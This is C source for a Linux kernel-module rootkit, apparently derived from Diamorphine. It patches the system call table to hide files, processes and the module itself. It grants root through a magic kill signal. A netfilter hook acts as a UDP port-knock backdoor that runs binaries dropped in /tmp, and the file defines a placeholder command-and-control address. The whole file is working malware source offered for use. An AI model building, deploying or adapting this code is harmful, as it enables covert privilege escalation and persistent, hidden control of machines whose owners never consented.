#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h> 
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>


#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
#include <asm/uaccess.h>
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
#include <linux/proc_ns.h>
#else
#include <linux/proc_fs.h>
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 26)
#include <linux/file.h>
#else
#include <linux/fdtable.h>
#endif

#if LINUX_VERSION_CODE <= KERNEL_VERSION(2, 6, 18)
#include <linux/unistd.h>
#endif

#ifndef __NR_getdents
#define __NR_getdents 141
#endif

#include "kkit.h"

static struct nf_hook_ops nfho;

#define SPORT0 1337
#define SPORT1 1338
#define SPORT2 1339
#define SPORT3 1340
#define DPORT 50005

#define PACKAGE "/usr/bin/tcp"
#define C2IP    "123.123.123.123"
#define C2PORT  "50001"

#define CMDS "/usr/bib/touch"
#define PK_PATH "/tmp/test1"

#define HTTP_URL "http://123.123.123.123:50002/"

static short payload_shell = -1;
static short debug_flag = 0;
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
unsigned long cr0;
#elif IS_ENABLED(CONFIG_ARM64)
void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
unsigned long start_rodata;
unsigned long init_begin;
#define section_size init_begin - start_rodata
#endif
static unsigned long *__sys_call_table;
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
	static t_syscall orig_getdents;
	static t_syscall orig_getdents64;
	static t_syscall orig_kill;
#else
	typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,
		unsigned int);
	typedef asmlinkage int (*orig_getdents64_t)(unsigned int,
		struct linux_dirent64 *, unsigned int);
	typedef asmlinkage int (*orig_kill_t)(pid_t, int);
	orig_getdents_t orig_getdents;
	orig_getdents64_t orig_getdents64;
	orig_kill_t orig_kill;
#endif

unsigned long *
get_syscall_table_bf(void)
{
	unsigned long *syscall_table;
	
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
#ifdef KPROBE_LOOKUP
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
	kallsyms_lookup_name_t kallsyms_lookup_name;
	register_kprobe(&kp);
	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);
#endif
	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
	return syscall_table;
#else
	unsigned long int i;

	for (i = (unsigned long int)sys_close; i < ULONG_MAX;
			i += sizeof(void *)) {
		syscall_table = (unsigned long *)i;

		if (syscall_table[__NR_close] == (unsigned long)sys_close)
			return syscall_table;
	}
	return NULL;
#endif
}


// http://www.drkns.net/kernel-who-does-magic/
static void shell_free_argv(struct subprocess_info * info){
  kfree(info->argv);
}

static int shell(void){
  struct subprocess_info * info;
  static char * envp[] = {
    "HOME=/",
    "TERM=linux", 
    "PATH=/sbin:/usr/sbin:/bin:/usr/bin", 
    NULL
  };

  char ** argv = kmalloc(sizeof(char *[5]), GFP_KERNEL);

  argv[0] = CMDS;
  argv[1] = PK_PATH;
  argv[2] = NULL;
//   argv[2] = C2PORT;
//   argv[3] = NULL;

  	info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL,NULL, shell_free_argv, NULL);
	if (!info)
		goto free_argv;
  
  	return call_usermodehelper_exec(info, UMH_WAIT_EXEC); 
free_argv:
	kfree(argv);
out:
	return -ENOMEM;
}

static __init int shell_test0(void)
{
    int result = 0;
    char cmd_path[] = "/usr/bin/touch";
    char* cmd_argv[] = {cmd_path,"/tmp/touch2.txt",NULL};
    char* cmd_envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/bin", NULL};

    result = call_usermodehelper(cmd_path, cmd_argv, cmd_envp, UMH_WAIT_PROC);
    if(debug_flag){
		printk(KERN_DEBUG "test driver init exec! there result of call_usermodehelper is %d\n", result);
    	printk(KERN_DEBUG "test driver init exec! the process is \"%s\", pid is %d.\n",current->comm, current->pid);
	}
    return result;
}

static __init int shell_test1(void)
{
    int result = 0;
    char cmd_path[] = "/tmp/ukk_hs";
    char* cmd_argv[] = {cmd_path, NULL, NULL};
    char* cmd_envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/bin", NULL};

    result = call_usermodehelper(cmd_path, cmd_argv, cmd_envp, UMH_WAIT_PROC);
	if(debug_flag){
		printk(KERN_DEBUG "test1 driver init exec! there result of call_usermodehelper is %d\n", result);
    	printk(KERN_DEBUG "test1 driver init exec! the process is \"%s\", pid is %d.\n",current->comm, current->pid);
	}
 
    return result;
}

static __init int shell_test2(void)
{
    int result = 0;
    char cmd_path[] = "/tmp/ukk_tc";
    char* cmd_argv[] = {cmd_path, NULL ,NULL};
    char* cmd_envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/bin", NULL};

    result = call_usermodehelper(cmd_path, cmd_argv, cmd_envp, UMH_WAIT_PROC);
    if(debug_flag){
		printk(KERN_DEBUG "test2 driver init exec! there result of call_usermodehelper is %d\n", result);
    	printk(KERN_DEBUG "test2 driver init exec! the process is \"%s\", pid is %d.\n",current->comm, current->pid);
	}
    return result;
}

unsigned int shell_exec(void){
	int result = 0;
	switch(payload_shell){
		case 0:
			result = shell_test0();
			break;
		case 1:
			result = shell_test1();
			break;
		case 2:
			result = shell_test2();
			break;
		default: 
			break;
	}
	if(debug_flag)
		printk("shell_exec: %d %d\n", payload_shell, result);
	payload_shell = -1;
	return result;
}

// struct udphdr {
// 	__be16	source;
// 	__be16	dest;
// 	__be16	len;
// 	__sum16	check;
// };
//Code from https://stackoverflow.com/a/16532923
unsigned int hook_func(unsigned int hooknum, struct sk_buff * skb) {
  struct iphdr *ip_header;       // ip header struct
//   struct tcphdr *tcp_header;     // tcp header struct
  struct udphdr *udp_header;
  struct sk_buff *sock_buff;
  unsigned int udp_len;
  unsigned int sport , dport;

  sock_buff = skb;

  if (!sock_buff)
    return NF_ACCEPT;

  ip_header = (struct iphdr *)skb_network_header(sock_buff);
  if (!ip_header)
    return NF_ACCEPT;

//   if(ip_header->protocol==IPPROTO_TCP)
  if(ip_header->protocol==IPPROTO_UDP)
  {
    //tcp_header= (struct tcphdr *)((__u32 *)ip_header+ ip_header->ihl);
	// sport = htons((unsigned short int) tcp_header->source);
    // dport = htons((unsigned short int) tcp_header->dest);
    udp_header = (struct udphdr*)((__u32 *)ip_header+ ip_header->ihl);
	sport = htons((unsigned short int) udp_header->source);
    dport = htons((unsigned short int) udp_header->dest);
	if(debug_flag)
		printk("hook_init %x %x\n", sport, dport);
    if(sport == SPORT0 && dport == DPORT){
      payload_shell = 0;
	//   printk("hook_func0 %x\n", sport);
    }
    if(sport == SPORT1 && dport == DPORT){
      payload_shell = 1;
	//   printk("hook_func1 %x\n", sport);
    }
    if(sport == SPORT2 && dport == DPORT){
      payload_shell = 2;
	//   printk("hook_func2 %x\n", sport);
    }
    if(sport == SPORT3 && dport == DPORT){
		if(debug_flag == 0){
			debug_flag = 1;
		}
		else{
			debug_flag = 0;
		}
	//   printk("hook_func3 %x\n", sport);
    }
  }
  return NF_ACCEPT;
}

static int load_netfilter_hook(void){
  int result;

  nfho.hook       = (void*) hook_func;
  nfho.hooknum    = 0;
  nfho.pf         = PF_INET;
  nfho.priority   = NF_IP_PRI_FIRST;

  //result = nf_register_hook(&nfho);

  result = nf_register_net_hook(&init_net , &nfho);
//   printk("hook_func netfilter\n");
  return result;
}


struct task_struct *
find_task(pid_t pid)
{
	struct task_struct *p = current;
	for_each_process(p) {
		if (p->pid == pid)
			return p;
	}
	return NULL;
}

int
is_invisible(pid_t pid)
{
	struct task_struct *task;
	if (!pid)
		return 0;
	task = find_task(pid);
	if (!task)
		return 0;
	if (task->flags & PF_INVISIBLE)
		return 1;
	return 0;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	int fd = (int) pt_regs->di;
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
	int fd = (int) pt_regs->regs[0];
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
#endif
	int ret = orig_getdents64(pt_regs), err;
#else
asmlinkage int
hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
	unsigned int count)
{
	int ret = orig_getdents64(fd, dirent, count), err;
#endif
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif
	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
		if ((!proc &&
		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
		|| (proc &&
		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
	shell_exec();
out:
	kfree(kdirent);
	return ret;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static asmlinkage long hacked_getdents(const struct pt_regs *pt_regs) {
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	int fd = (int) pt_regs->di;
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
		int fd = (int) pt_regs->regs[0];
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
#endif
	int ret = orig_getdents(pt_regs), err;
#else
asmlinkage int
hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
	unsigned int count)
{
	int ret = orig_getdents(fd, dirent, count), err;
#endif
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;	

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif

	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
		if ((!proc && 
		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
		|| (proc &&
		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;

out:
	kfree(kdirent);
	return ret;
}

void
give_root(void)
{
	#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
		current->uid = current->gid = 0;
		current->euid = current->egid = 0;
		current->suid = current->sgid = 0;
		current->fsuid = current->fsgid = 0;
	#else
		struct cred *newcreds;
		newcreds = prepare_creds();
		if (newcreds == NULL)
			return;
		#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) \
			&& defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) \
			|| LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
			newcreds->uid.val = newcreds->gid.val = 0;
			newcreds->euid.val = newcreds->egid.val = 0;
			newcreds->suid.val = newcreds->sgid.val = 0;
			newcreds->fsuid.val = newcreds->fsgid.val = 0;
		#else
			newcreds->uid = newcreds->gid = 0;
			newcreds->euid = newcreds->egid = 0;
			newcreds->suid = newcreds->sgid = 0;
			newcreds->fsuid = newcreds->fsgid = 0;
		#endif
		commit_creds(newcreds);
	#endif
	if(debug_flag == 0){
		printk("give root ok\n");
	}
}

static inline void
tidy(void)
{
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
}

static struct list_head *module_previous;
static short module_hidden = 0;
void
module_show(void)
{
	list_add(&THIS_MODULE->list, module_previous);
	module_hidden = 0;
}

void
module_hide(void)
{
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_hidden = 1;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
asmlinkage int
hacked_kill(const struct pt_regs *pt_regs)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	pid_t pid = (pid_t) pt_regs->di;
	int sig = (int) pt_regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
	pid_t pid = (pid_t) pt_regs->regs[0];
	int sig = (int) pt_regs->regs[1];
#endif
#else
asmlinkage int
hacked_kill(pid_t pid, int sig)
{
#endif
	struct task_struct *task;
	switch (sig) {
		//-60
		case SIGINVIS:
			if ((task = find_task(pid)) == NULL)
				return -ESRCH;
			task->flags ^= PF_INVISIBLE;
			break;
		//-61
		case SIGSUPER:
			give_root();
			break;
		//-62
		case SIGMODINVIS:
			if (module_hidden) module_show();
			else module_hide();
			break;
		default:
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
			return orig_kill(pt_regs);
#else
			return orig_kill(pid, sig);
#endif
	}
	return 0;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static inline void
write_cr0_forced(unsigned long val)
{
	unsigned long __force_order;

	asm volatile(
		"mov %0, %%cr0"
		: "+r"(val), "+m"(__force_order));
}
#endif

static inline void
protect_memory(void)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	write_cr0_forced(cr0);
#else
	write_cr0(cr0);
#endif
#elif IS_ENABLED(CONFIG_ARM64)
	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
			section_size, PAGE_KERNEL_RO);

#endif
}

static inline void
unprotect_memory(void)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	write_cr0_forced(cr0 & ~0x00010000);
#else
	write_cr0(cr0 & ~0x00010000);
#endif
#elif IS_ENABLED(CONFIG_ARM64)
	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
			section_size, PAGE_KERNEL);
#endif
}

static int __init
kkit_init(void)
{

	if( load_netfilter_hook()){
		return 1;
	}

	__sys_call_table = get_syscall_table_bf();
	if (!__sys_call_table)
		return -1;

#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	cr0 = read_cr0();
#elif IS_ENABLED(CONFIG_ARM64)
	update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
	start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
	init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");
#endif

	module_hide();
	tidy();

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
	orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
	orig_kill = (t_syscall)__sys_call_table[__NR_kill];
#else
	orig_getdents = (orig_getdents_t)__sys_call_table[__NR_getdents];
	orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
#endif

	unprotect_memory();

	__sys_call_table[__NR_getdents] = (unsigned long) hacked_getdents;
	__sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;

	protect_memory();

	return 0;
}

static void __exit
kkit_cleanup(void)
{

	nf_unregister_net_hook(&init_net ,&nfho);

	unprotect_memory();

	__sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;

	protect_memory();
}

module_init(kkit_init);
module_exit(kkit_cleanup);

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("m0nad");
MODULE_DESCRIPTION("LKM rootkit");
